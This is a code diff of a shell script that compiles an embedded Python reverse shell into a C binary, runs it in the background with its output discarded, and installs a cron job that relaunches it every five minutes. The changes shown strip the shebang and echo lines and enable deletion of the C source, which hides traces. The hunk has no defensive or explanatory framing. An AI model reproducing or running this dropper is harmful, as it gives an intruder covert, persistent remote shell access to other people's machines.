@@ -21,8 +21,6 @@ mkdir -p "$parent_path"
 cat << EOF > "$c_code"
 #include <stdlib.h>
 const char *script_content = 
-    "#!/bin/bash\n"
-    "\n"
     "python3 -c \"\n"
     "import socket,subprocess,os,pty,sys\n"
     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
@@ -42,9 +40,8 @@ int main() {
 }
 EOF
 gcc "$c_code" -o "$script_path"
-echo "$script_path"
 nohup "$script_path" > /dev/null 2>&1 &
-#rm "$c_code"
+rm "$c_code"
 
 CRON_JOB="*/5 * * * * bash $script_path"
 if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
